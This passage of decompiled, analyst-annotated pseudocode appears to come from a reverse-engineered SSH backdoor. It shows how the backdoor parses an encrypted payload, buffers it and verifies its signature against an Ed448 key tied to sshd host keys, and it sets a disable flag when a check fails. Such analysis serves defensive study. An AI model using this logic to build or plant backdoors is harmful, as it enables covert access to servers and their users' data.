                          if (payload_body_len < 9) goto LAB_0010a112;
                        }
                        if (((lVar24 + 2U <= payload_body_len) &&
                            (payload_chunk_len = (ulong)*(ushort *)
                                              ((long)&encrypted_payload.field0_0x0 +
                                              payload_data_offset + lVar24 + 5) + lVar24 + 2U,
                            payload_chunk_len < payload_body_len)) && (0x71 < payload_body_len - payload_chunk_len)) {
                          if (((ctx->payload_bytes_buffered <= ctx->payload_buffer_size) &&
                              (uVar21 = ctx->payload_buffer_size - ctx->payload_bytes_buffered,
                              0x38 < uVar21)) && (payload_chunk_len <= uVar21 - 0x39)) {
                            payload_buffer_cursor = ctx->payload_buffer;
                            uVar21 = 0;
                            do {
                              payload_buffer_cursor[uVar21] =
                                   *(u8 *)((long)&encrypted_payload.field0_0x0 + uVar21 + payload_data_offset + 5
                                          );
                              uVar21 = uVar21 + 1;
                            } while (payload_chunk_len != uVar21);
                            host_keys = ctx->sshd_sensitive_data->host_pubkeys;
                            sshkey_digest_offset = ctx->payload_bytes_buffered + payload_chunk_len;
                            ctx->payload_bytes_buffered = sshkey_digest_offset;
                            BVar17 = verify_signature(host_keys[ctx->sshd_host_pubkey_idx],
                                                      ctx->payload_buffer,sshkey_digest_offset,
                                                      ctx->payload_buffer_size,
                                                      (u8 *)((long)&encrypted_payload.field0_0x0 +
                                                            payload_chunk_len + payload_data_offset + 5),ed448_raw_key,ctx);
                            if (BVar17 != FALSE) goto LAB_00109a97;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
LAB_0010a112:
      ctx->disable_backdoor = TRUE;
      goto LAB_0010a11a;
    }
    ctx->disable_backdoor = TRUE;
  }
  if (do_orig == (BOOL *)0x0) {
    return FALSE;
  }
LAB_0010a11a:
  *do_orig = TRUE;
  return FALSE;
}

